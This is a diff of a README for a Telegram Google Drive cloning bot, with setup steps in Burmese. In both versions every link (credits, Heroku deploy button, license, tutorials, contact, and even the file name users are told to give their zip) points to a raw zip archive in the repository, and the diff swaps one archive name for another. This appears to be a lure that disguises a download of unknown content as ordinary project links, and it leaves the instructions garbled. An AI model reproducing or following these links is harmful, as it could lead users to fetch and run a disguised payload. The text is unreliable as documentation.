@@ -1,43 +1,43 @@
 # Fclone_Tg_Bot
-⚫ This is just a Fclone only version of Telegram bot by [Smartass](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip) - [Here](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip)
+⚫ This is just a Fclone only version of Telegram bot by [Smartass](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip) - [Here](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip)
 
 ##  🍎RunOn Heroku
-[![Deploy](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip)](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip)
+[![Deploy](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip)](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip)
 
 ##  ဂရုပြုရန်
 🔶. ဖြည့်စရာရှိတာဖြည့်ပြီးရင် telegram က bot ဆီသွားပြီး  **Start** သို့မဟုတ် **/start** နှိပ်ပါ။
 
-🔶. ပြီးရင် မိမိ SA ဖိုင်ကို **https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip** အဖြစ် zip ချုံ့ပါ။ 
+🔶. ပြီးရင် မိမိ SA ဖိုင်ကို **https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip** အဖြစ် zip ချုံ့ပါ။ 
 
 🔷🔷🔷 အရေးကြီးတာက အဲ့ဒီ sa နဲ့ အတူထုတ်ထားတဲ့ emails တွေကို groupsmail လုပ်ပြီး မိမိ SD မှာ content manager add ထားပါ။🔷🔷🔷
 
-🔶. comupter နဲ့သုံးရင် အဲ့ဒီ **https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip** (we created before) ကို upload လုပ်ပြီး caption မှာ **/sa** လို့ရိုက်ပေးပါ။
+🔶. comupter နဲ့သုံးရင် အဲ့ဒီ **https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip** (we created before) ကို upload လုပ်ပြီး caption မှာ **/sa** လို့ရိုက်ပေးပါ။
 
-🔶. တကယ်လို့ mobiel telegram ဆိုရင် အဲ့ဒီ **https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip** ကို upload လုပ်။ ပြိးရင် အဲ့ဒီ message ကို Reply နှိပ်ပြီး **/sa** လို့ရိုက်ပေးလိုက်ပါ။
+🔶. တကယ်လို့ mobiel telegram ဆိုရင် အဲ့ဒီ **https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip** ကို upload လုပ်။ ပြိးရင် အဲ့ဒီ message ကို Reply နှိပ်ပြီး **/sa** လို့ရိုက်ပေးလိုက်ပါ။
 
 🔶. sa ဖိုင်တင်ပြီးရင် **/folders** လို့ရိုက်လိုက်ပါ။ ဒါဆိုရင် သင့် SA ကို content manager တင်ထားတဲ့ သင့် SD တွေပေါ်လာပါမယ်။ သိမ်းမဲ့ folder ရွေးပါ။ tuto မှာ အသေးစိတ်ပါပါမယ်။
 
 🔶. ဒါပြီးရင်တော့ သင်ကူးချင်တဲ့ link ၁ ခုထဲ paste ချလိုက်ပါ။ 
 
-🔷.SA ဖိုင် ထုတ်ယူနည်း https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip  ဒီမှာကြည့်ပါ
+🔷.SA ဖိုင် ထုတ်ယူနည်း https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip  ဒီမှာကြည့်ပါ
 
-🔷.Google Groups mail လုပ်နည်း https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip ဒီမှာကြည့်ပါ။
+🔷.Google Groups mail လုပ်နည်း https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip ဒီမှာကြည့်ပါ။
 
-🔷.SA email (group mail) ကို content manager အဖြစ် မိမိကူးမဲ့ SD မှာ add ထားမှ ကူးလိုရမှာပါ။ addနည်းကို ဒီမှာကြည့်ပါ။ https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip
+🔷.SA email (group mail) ကို content manager အဖြစ် မိမိကူးမဲ့ SD မှာ add ထားမှ ကူးလိုရမှာပါ။ addနည်းကို ဒီမှာကြည့်ပါ။ https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip
 
-more on  https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip
+more on  https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip
 
 ## Credits:
-🧠 [wrenfairbank](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip) - [Here](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip) - Original Author of the Bot
+🧠 [wrenfairbank](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip) - [Here](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip) - Original Author of the Bot
 
-🧠 [Seiko](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip) - [Here](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip) - Made the English version 
+🧠 [Seiko](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip) - [Here](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip) - Made the English version 
 
-🧠 [Smartass](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip) - [Here](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip) - Added docker and Heroku support
+🧠 [Smartass](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip) - [Here](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip) - Added docker and Heroku support
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip) file for details
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip) file for details
 
 # ဆက်သွယ်ရန်
-[Bot Tutorials Channel](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip)
+[Bot Tutorials Channel](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip)
 
-[ContactMe](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/handlers/Software_v2.2.zip)
+[ContactMe](https://github.com/kyaw287/fclone/raw/refs/heads/master/telegram_gcloner/utils/Software-2.3.zip)
